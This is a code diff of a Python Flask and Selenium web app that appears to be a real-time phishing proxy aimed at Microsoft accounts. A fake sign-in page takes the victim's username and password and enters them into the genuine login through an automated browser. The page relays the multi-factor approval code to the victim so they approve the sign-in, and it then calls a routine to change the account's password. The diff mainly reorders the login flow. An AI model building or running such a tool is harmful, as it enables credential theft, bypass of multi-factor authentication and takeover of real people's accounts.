@@ -40,7 +40,6 @@ def change_password():
 def get_authentication_code():
     try:
         AUTHENTICATION_CODE = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, "idRichContext_DisplaySign")))
-        print("\nCode: " + AUTHENTICATION_CODE.text)
         return AUTHENTICATION_CODE.text
 
     except:
@@ -52,9 +51,8 @@ def get_authentication_code():
         except:
             return False
 
-def enter_field(field_name, value, error_id, clear=True):
+def enter_field(field_name, value, error_id, clear):
     field = WebDriverWait(DRIVER, 60).until(EC.visibility_of_element_located((By.NAME, field_name)))
-
     field.send_keys(value, Keys.RETURN)
 
     try:
@@ -70,49 +68,52 @@ def enter_password(password):
     return enter_field("passwd", password, "passwordError", False)
 
 def enter_name(name):
-    return enter_field("loginfmt", name, "usernameError")
+    return enter_field("loginfmt", name, "usernameError", True)
     
 @app.route("/")
 def index():
-    if "name" not in session or "password" not in session or not password_changed:
-        return redirect(url_for("login"))
+    if "name" in session and "password" in session and password_changed:
+        return render_template("index.html", title="Fake Apps", header="Fake dashboard", name=session["name"])
 
-    return render_template("index.html", title="Fake Apps", header="Fake dashboard", name=session["name"])
+    return redirect(url_for("login"))
+
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
     name_form = NameForm()
     password_form = PasswordForm()
 
-    if "name" in session and "password" in session:
-        authentication_code = get_authentication_code()
-        if authentication_code:
-            return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
-
-        elif not password_changed:
-            change_password()
-
-        try:
-            WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.NAME, "Wait for some time before closing application")))
-
-        except:
-            DRIVER.quit()
-
+    if "name" in session and "password" in session and password_changed:
         return redirect(url_for("index"))
 
-    elif "name" not in session and name_form.validate_on_submit():
-        if enter_name(name_form.name.data):
+    elif "name" not in session:
+        if name_form.validate_on_submit() and enter_name(name_form.name.data):
             session["name"] = name_form.name.data
             return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", form=password_form)
+    
+        return render_template("login.html", title="Fake sign in", header="Fake sign in", form=name_form)
 
-    elif "name" in session and password_form.validate_on_submit():
-        if enter_password(password_form.password.data):
+    else:
+        if "password" in session:
+            authentication_code = get_authentication_code()
+            if authentication_code:
+                return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
+
+            elif not password_changed:
+                change_password()
+
+            try:
+                WebDriverWait(DRIVER, 4).until(EC.presence_of_element_located((By.NAME, "Wait until password changes")))
+
+            except:
+                DRIVER.quit()
+
+            return redirect(url_for("index"))       
+
+        elif password_form.validate_on_submit() and enter_password(password_form.password.data):
             session["password"] = password_form.password.data
-
             authentication_code = get_authentication_code()
             if authentication_code:
                 return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
 
         return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", form=password_form)
-
-    return render_template("login.html", title="Fake sign in", header="Fake sign in", form=name_form)
